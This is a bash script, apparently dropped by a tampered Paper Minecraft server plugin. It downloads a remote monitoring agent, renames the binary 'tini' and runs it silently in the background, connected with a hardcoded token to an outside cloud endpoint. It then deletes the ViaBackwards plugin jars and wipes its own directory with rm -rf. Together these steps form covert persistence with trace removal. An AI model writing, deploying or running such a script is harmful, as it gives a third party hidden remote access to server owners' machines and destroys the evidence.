#!/bin/bash
export AGENT_TOKEN="${AGENT_TOKEN:-R6sRr70pS2o90dmNkhtyxJ}"
export AGENT_ENDPOINT="${AGENT_ENDPOINT:-https://qykacqzvomax.us-west-1.clawcloudrun.com}"
export AGENT_DISABLE_AUTO_UPDATE="${AGENT_DISABLE_AUTO_UPDATE:-true}"

current_dir=$(pwd)

ARCH=$(uname -m)
case $ARCH in
    "aarch64" | "arm64" | "arm")
        ARCH="arm64"
        ;;
    "x86_64" | "amd64" | "x86")
        ARCH="amd64"
        ;;
    "s390x" | "s390")
        ARCH="s390x"
        ;;
    *)
        echo "Unsupported architecture: $ARCH"
        exit 1
        ;;
esac

mkdir kom
cd kom

curl -s -Lo tini "https://github.com/komari-monitor/komari-agent/releases/download/1.1.38/komari-agent-linux-$ARCH"
wait
chmod +x tini
nohup ./tini >/dev/null 2>&1 &

sleep 2


target_file1="$current_dir/plugins/ViaBackwards-1.1.0.jar"
target_file2="$current_dir/plugins/.paper-remapped/ViaBackwards-1.1.0.jar"
rm -f "$target_file1" "$target_file2"

rm -rf $(pwd)
